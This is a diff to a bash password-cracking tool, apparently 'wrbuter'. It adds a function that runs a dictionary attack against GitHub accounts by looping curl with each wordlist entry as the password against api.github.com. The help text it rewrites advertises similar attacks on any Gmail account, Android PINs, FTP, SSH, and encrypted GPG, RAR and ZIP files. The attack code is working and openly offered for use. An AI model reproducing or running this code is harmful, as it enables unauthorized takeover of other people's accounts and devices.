@@ -115,7 +115,7 @@ elif [[ $ADBW = "recovery" ]]; then
 elif [[ $ADBF = "fastboot" ]]; then
     echo "fastboot" > $(pwd)/.wdroid-status
 else
-    echo " * No device connected.."
+    echo "* No device connected.."
 exit
 fi
 
@@ -128,7 +128,7 @@ fi
 ################################################################################
 adb devices |sed -n 2p|grep una &> /dev/null
 if [[ $? -eq "0" ]]; then
-   echo " * Your device has not been authorized with this pc, aborted."
+   echo "* Your device has not been authorized with this pc, aborted."
    exit
 fi
 
@@ -683,6 +683,35 @@ fi
 done < $zwordlist
 }
 
+github() {
+read -p "User: " user
+read -p "Wordlist: " wordlist
+
+if [[ ! -f $wordlist ]]; then
+  echo "Can't find a such wordlist, aborted"
+  exit 0
+fi
+
+printf "\n====================================================="
+printf "\nBruteforce attack will be started within 2 seconds..\n"
+printf "Please use (CTRL+C) to abort the attack at anytime..\n"
+printf "=====================================================\n"
+
+while read line; do
+curl -su $user:$line -X GET https://api.github.com|grep -iq 'Bad'
+if [[ $? -gt "0" ]]; then
+printf "\nFound password for $user: \e[1;32m$line\e[0m\n\n"
+exit 1
+else
+printf "Wrong password for $user: \e[1;31m$line\e[0m\n"
+fi
+done < $wordlist
+printf "%50s\n" | tr ' ' '='
+echo "No password matched in $wordish - Try another wordlist"
+printf "%50s\n" | tr ' ' '='
+}
+
+
 ################################################################################
 ################################################################################
 ####                                                                        ####
@@ -742,9 +771,11 @@ elif [[ $1 = "--android-gui" && ! $2 = "6" ]] || [[ $1 = "-A" && ! $2 = "6" ]]; 
     android_usage
 elif [[ $1 = "-f" || $1 = "-ftp" || $1 = "--f" || $1 = "--ftp" ]]; then
      ftpattack
+elif [[ $1 = "-gi" || $1 = "-github" || $1 = "--gi" || $1 = "--github" ]]; then
+     github
 elif [[ $1 = "-g" || $1 = "-gmail" || $1 = "-g" || $1 = "--gmail" ]]; then
      gmailattack
-elif [[ $1 = "-g" || $1 = "-gpg" || $1 = "--g" || $1 = "--gpg" ]]; then
+elif [[ $1 = "-G" || $1 = "-gpg" || $1 = "--G" || $1 = "--gpg" ]]; then
      gpgattack
 elif [[ $1 = "-r" || $1 = "-rar" || $1 = "--r" || $1 = "--rar" ]]; then
      rarattack
@@ -762,16 +793,19 @@ else
 if [[ $* = "-n" ]]; then
 printf "
 
-     -a|--android [4] [6] [wordfile]   - Brute force attack any android device with 100% guarantee to crack pin via locksettings
-     -A|--androidgui [4] [6]           - Brute force attack any android device via gui/login screen
-     -f|--ftp                          - Dictionary attack for crack password for on a ftp server (ftps is supported)
-     -g|--gmail                        - Dictionary attack for crack password for any gmail account
-     -G|--gpg                          - Dictionary attack for break the encryption of GPG encrypted files protected by a passphrase
-     -r|--rar                          - Dictionary attack for break the encryption of rar files
-     -s|--ssh                          - Dictionary attack for crack ssh passphrase on any ssh server via parallel ssh (all versions supported)
-     -z|--zip                          - Dictionary attack a zip encryptedfile, brute force mode is enable for ZIP files
-     -Z|--znc                          - Dictionary attack for ZNC bouncer's web loginn
-     -v|--version                      - Print version of $basename$0
+  $basename$0 $VERSION - is a tool for using brute force & dictionary attacking methods to attack various stuff written in \e[1;1mpure\e[0m bash code
+
+      --android [4] [6] [wordfile]   - Brute force attack any android device with 100% guarantee to crack pin via locksettings
+      --androidgui [4] [6]           - Brute force attack any android device via gui/login screen
+      --ftp                          - Dictionary attack for crack password for on a ftp server (ftps is supported)
+      --gmail                        - Dictionary attack for crack password for any gmail account
+      --github                       - Dictionary attack for github accounts via web
+      --gpg                          - Dictionary attack for break the encryption of GPG encrypted files protected by a passphrase
+      --rar                          - Dictionary attack for break the encryption of rar files
+      --ssh                          - Dictionary attack for crack ssh passphrase on any ssh server via parallel ssh (all versions supported)
+      --zip                          - Dictionary attack a zip encryptedfile, brute force mode is enable for ZIP files
+      --znc                          - Dictionary attack for ZNC bouncer's web loginn
+      --version                      - Print version of $basename$0
 
 "
 else
@@ -780,18 +814,18 @@ printf "
 
   $basename$0 $VERSION - is a tool for using brute force & dictionary attacking methods to attack various stuff written in \e[1;1mpure\e[0m bash code
 
-     $BLUE -a$END|$BRIGHTBLUE--android [4] [6] [wordfile]   - Brute force attack any android device with 100% guarantee to crack pin via locksettings
-     $MAGENTA -A$END|$BRIGHTMAGENTA--androidgui                   - Brute force attack any android device via gui/login screen
-     $GREEN -f$END|$BRIGHTGREEN--ftp                          - Dictionary attack for crack password for on a ftp server (ftps is supported)
-     $RED -g$END|$BRIGHTRED--gmail                        - Dictionary attack for crack password for any gmail account
-     $BLUE -G$END|$BRIGHTBLUE--gpg                          - Dictionary attack for break the encryption of GPG encrypted files protected by a passphrase
-     $BRIGHTCYAN -n$END|$CYAN--no-colors                    - Do not include colors in help
-     $BRIGHTYELLOW -h$END|$BRIGHTYELLOW--help                         - Print help for wrbuter v3.0
-     $RED -r$END|$BRIGHTRED--rar                          - Dictionary attack for break the encryption of rar files
-     $CYAN -s$END|$BRIGHTCYAN--ssh                           -Dictionary attack for crack ssh passphrase on any ssh server via parallel ssh (all versions supported)
-     $GRAY -z$END|$BRIGHTGRAY--zip                          - Dictionary attack a zip encryptedfile, brute force mode is enable for ZIP files
-     $YELLOW -Z$END|$YELLOW--znc                          - Dictionary attack for ZNC bouncer's web loginn
-     $WHITE -v$END|$BRUGHTWHITE--version                      - Print version of $basename$0
+     $BRIGHTBLUE--android [4] [6] [wordfile]   - Brute force attack any android device with 100% guarantee to crack pin via locksettings
+     $BRIGHTMAGENTA--androidgui                   - Brute force attack any android device via gui/login screen
+     $BRIGHTGREEN--ftp                          - Dictionary attack for crack password for on a ftp server (ftps is supported)
+     $BRIGHTRED--gmail                        - Dictionary attack for crack password for any gmail account
+     $BRIGHTCYAN--github                       - Dictionary attack for github accounts via web
+     $BRIGHTBLUE--gpg                          - Dictionary attack for break the encryption of GPG encrypted files protected by a passphrase
+     $CYAN--no-colors                    - Do not include colors in help
+     $BRIGHTRED--rar                          - Dictionary attack for break the encryption of rar files
+     $BRIGHTCYAN--ssh                           -Dictionary attack for crack ssh passphrase on any ssh server via parallel ssh (all versions supported)
+     $BRIGHTGRAY--zip                          - Dictionary attack a zip encryptedfile, brute force mode is enable for ZIP files
+     $YELLOW--znc                          - Dictionary attack for ZNC bouncer's web loginn
+     $BRUGHTWHITE--version                      - Print version of $basename$0
 
 "
 fi
